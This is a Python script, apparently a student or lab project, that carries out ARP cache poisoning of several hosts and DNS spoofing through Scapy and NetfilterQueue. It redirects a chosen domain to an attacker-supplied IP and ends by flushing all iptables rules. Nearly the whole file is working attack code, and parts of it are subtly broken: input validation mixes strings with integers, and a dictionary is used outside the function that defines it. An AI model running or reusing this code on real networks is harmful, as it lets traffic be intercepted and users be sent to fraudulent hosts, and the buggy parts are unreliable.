# MITM ARP poisoning attack & DNS spoofing attack - using Scapy

# To Do: before you are able to run the dns_spoof() method succesfully, you'll need to perform
#        the following commands in the terminal.
#
# In terminal:
#   wget -c https://bootstrap.pypa.io/pip/2.7/get-pip.py
#   python get-pip.py
#   sudo apt update && sudo apt install python-dev build-essential libnetfilter-queue-dev
#   pip install netfilterqueue==0.9.0

# Imports
from unittest import skip
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import logging as log
import threading

# The main method containing both the arp_poison() method and the dns_spoof() method.
def main():
    typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
    if (typeOfAttack == 1):
        arp_poison()
    elif (typeOfAttack == 2):
        dns_spoof()
    else:
        print("No or wrong input.")

# This arp_poison() method is used for the MITM ARP poisoning attack.
def arp_poison():
    # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
    nrOfHosts = int(input("The number of hosts you want to ARP poison: "))

    # If number of hosts is less than 2, a while loop is instantiated which can only be left if the number of hosts becomes greater or equal than 2.
    if (nrOfHosts < 2):
        print("A MITM ARP poisoning attack with less than 2 hosts is not possible.")
        print("The number of hosts you want to ARP poison: ")
        while (nrOfHosts < 2):
            nrOfHosts = input()

    # The user is given the option to choose how often the ARP entries need to be updated by choosing the time in seconds in between the spoofed ARP messages are sent.
    updateTimer = int(input("The time (in seconds) in between the spoofed ARP messages are sent (advice: Do not set it too high, e.g. > 60).\nSet update timer to: "))

    # If update timer is set to less than 1 seconds, a while loop is instantiated which can only be left if the update timer is set to greater or equal than 1.
    if (updateTimer < 1):
        print("A MITM ARP poisoning attack with an update timer < 1 seconds is not possible.")
        print("The time (in seconds) it takes for the ARP entries to be updated (advice: Do not set it too high, e.g. > 60 seconds).\nSet the update timer to: ")
        while (updateTimer < 1):
            updateTimer = input()

    # Note that the indexes of these two lists below containing the MAC addresses and IP addresses correspond.
    # This is due to the fact that the input is requested in order from the user in the for-loop below.

    # Create a list of all the MAC addresses of the victims.
    macVictimList = []

    # Create a list of all the IP addresses of the victims.
    ipVictimList = []

    # The MAC and IP addresses of the victims and the attacker are obtained in this for-loop.
    for i in range(nrOfHosts): 
        # Note: i + 1 is printed to the user of the software as this seems to be more intuitive.
        macVictimList.append(raw_input("The MAC address of the " + str(i+1) + "th victim:"))
        ipVictimList.append(raw_input("The IP address of the " + str(i+1) + "th victim:"))
    # The MAC address of the attacker is obtained.
    macAttacker = raw_input("The MAC address of the attacker:")
    
    # Send ARP package to every victim saying that each other victim is the attacker using the spoofed MAC address of the attacker.
    # Integer i goes through all the hosts and represents the victims that will be fooled.
    for i in range(nrOfHosts):
        if (i==nrOfHosts):
                break
        # Integer j goes through all the hosts and represents the IP addresses that will be spoofed. 
        # Essentially, the goal is to have every host thinking that every other host is the attacker.
        for j in range(nrOfHosts):
            # No need to send ARP package to itself. So if i == j, we increase j and skip the step of sending an ARP packet.
            if (i==j):
                j+=1
            # Since we indent by 1 at every time i == j, at the very last host the attacker can send a message pretending to be someone that is out of the index of ipVictimList.
            # To prevent getting an index out of bounds error, we break the loop if j == nrOfHosts.
            if (j==nrOfHosts):
                break
            arp = Ether() / ARP()
            arp[Ether].src = macAttacker
            arp[ARP].hwsrc = macAttacker
            arp[ARP].psrc = ipVictimList[j] # Spoofed victim
            arp[ARP].hwdst = macVictimList[i] # Tricked victim
            arp[ARP].pdst = ipVictimList[i]
            sendp(arp, iface="enp0s9")
    
    # Call sniff to start sniffing for incoming packets from victims
    # Sniff is technically unnecessary for the purpose of the code, as Wireshark will simply do sniff's work.
    # However, if you want to sniff the packets via Scapy and get a summary of them on Scapy, then you will need sniff.
    # Keep in mind that while sniff is active, the code will not send ARP packets periodically.
    # You will also need to ctrl + C the code to stop the sniffing and send spoofed ARP packets, and you will need to ctrl + C again to stop the code.
    # Uncomment the following line to enable sniff:
    #sniff(iface = "enp0s9")

    # An infinite loop is used to send ARP packages continuously updating the ARP tables of the victims.
    # Considering the fact that ARP table entries get deleted unless they are refreshed (possibly with a new MAC address), 
    # this while-loop is needed to prevent the situation in which our MAC addreses get deleted or overwritten by the actual correct MAC addresses.
    while(True):     
        # Send ARP package to every victim saying that each other victim is the attacker using the spoofed MAC address of the attacker.
        # Integer i goes through all the hosts and represents the victims that will be fooled.
        for i in range(nrOfHosts):
            if (i==nrOfHosts):
                break
            # Integer j goes through all the hosts and represents the IP addresses that will be spoofed. 
            # Essentially, the goal is to have every host thinking that every other host is the attacker.
            for j in range(nrOfHosts):
                # No need to send ARP package to itself. So if i == j, we increase j and skip the step of sending an ARP packet.
                if (i==j):
                    j+=1
                # Since we indent by 1 at every time i == j, at the very last host the attacker can send a message pretending to be someone that is out of the index of ipVictimList.
                # To prevent getting an index out of bounds error, we break the loop if j == nrOfHosts.
                if (j==nrOfHosts):
                    break
                arp = Ether() / ARP()
                arp[Ether].src = macAttacker
                arp[ARP].hwsrc = macAttacker
                arp[ARP].psrc = ipVictimList[j] # Spoofed victim
                arp[ARP].hwdst = macVictimList[i] # Tricked victim
                arp[ARP].pdst = ipVictimList[i]
                sendp(arp, iface="enp0s9")
       
        # The ARP table update timer
        # The default updateTimer value we used while testing was: updateTimer = 3.
        time.sleep(updateTimer)

# This dns_spoof() method is used for the MITM DNS spoofing attack.
# This method is adapted code from the source code: https://www.thepythoncode.com/code/make-dns-spoof-python
def dns_spoof():

    # The user needs to input the webpage he/she wants to DNS spoof.
    url_webpage = raw_input("The URL of the webpage you want to DNS spoof (e.g., www.google.com): ")

    # The user needs to input the ip of the host he/she wants to forward the victim to.
    ip_dns_spoof = raw_input("The IP address of the host you want to DNS spoof with (Note: your victim will be sent to this webpage): ")

    # In order to be able to perform a DNS spoofing attack on a victim we need to ARP poison both the victim and the gateway router.
    # Hence the arp_poison() method is used to make this possible.
    print("In order to be able to perform a DNS spoofing attack on a victim we need to ARP poison both the victim and the gateway router.\n")
    print("Hence a ARP poisoning attack is now initiated.\n")

    # Starting a thread for the arp_poison() method
    arp_poison_thread = threading.Thread(target=arp_poison, name="arp_poison_is_live")
    arp_poison_thread.start()

    # Dictionary containing the url_webpage which will be spoofed and the IP address of the host the victim will be forwarded to.
    # Note: more key-value pairs can be added manually down here if you want to spoof multiple webpages at once.
    #       The option to spoof mutiple different websites with multiple different IP addresses could also be added to this method in the future.
    dns_hosts = {
        url_webpage: ip_dns_spoof,
    }

    # Set queue_num to 0, this uniquely identifies the queue for the kernel.
    QUEUE_NUM = 0
    # Insert the iptables FORWARD rule in a subshell.
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # Create the netfilter queue object.
    # Using "queue" we can now access the packets matching the iptables rule.
    queue = NetfilterQueue()
    try:
        # Bind the queue number to the method process_packet().
        queue.bind(QUEUE_NUM, process_packet)
         # Start the queue, we now start receiving packets.
        queue.run()
    except KeyboardInterrupt:
        # If the user interrupts the program's execution, delete all the rules temporarily.
        # This removes that rule that we just inserted. After you restart the iptables, you'll see the default rules again. 
        # So we are simply going back to normal.
        os.system("iptables --flush")

# Whenever a new packet is redirected to the netfilter queue, this method is called.
def process_packet(packet):
    # Convert netfilter queue packet to scapy packet.
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # If the packet is a DNS Resource Record (DNS reply), we modify the packet using the modify_packet() method.
        # Print summary of packet before modifying it.
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # An IndeError occurs when the packet is not an UDP packet.
            # Instead, the packet could be an IPerror/UDPerror packet.
            # When an IndexError occurs, we do not modify the packet using the modify_packet() method.
            pass
        # Print summary of packet after modifying it.
        print("[After ]:", scapy_packet.summary())
        # Convert scapy packet back to netfilter queue packet.
        packet.set_payload(bytes(scapy_packet))
    # We accept the packet as it has been either modified successfully or is an IPerror/UDPerror packet.
    # Meaning we are only letting through spoofed packets.
    packet.accept()

# This function modifies the DNS Resource Record packet (the DNS reply) such that it maps our dictionary "dns_hosts".
# When we see an "url_webpage" reply, the real IP address in the packet gets replaced with the IP address "ip_dns_spoof."
def modify_packet(packet):
    # We obtain the DNS domain name of the DNS request.
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # If the website/domain name is not in our dictionary "dns_hosts", we do not modify the packet.
        # We simply return the packet unmodified.
        print("no modification:", qname)
        return packet
    # If qname is in the dictionary "dns_hosts", the IP address needs to be replaced.
    # Hence we craft a new reply packet overriding the original reply.
    # We set the rdata for the IP we want to redirect the victim to.
    # So if qname == url_webpage, then url_webpage will be mapped to the corresponding spoofing IP address "ip_dns_spoof" from the dictionary "dns_hosts".
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1, indicating that the number of items in the answer section is equal to 1.
    packet[DNS].ancount = 1
    # We delete the checksums and the length of the packet. This is needed because the checksum and the length of the packet have changed due to modification of the packet.
    # Of course calculations are required in order to obtain the new checksums and the length of the modified packet. This is automatically done by scapy.
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # We return the modified packet.
    return packet

# Run the main method.
main()
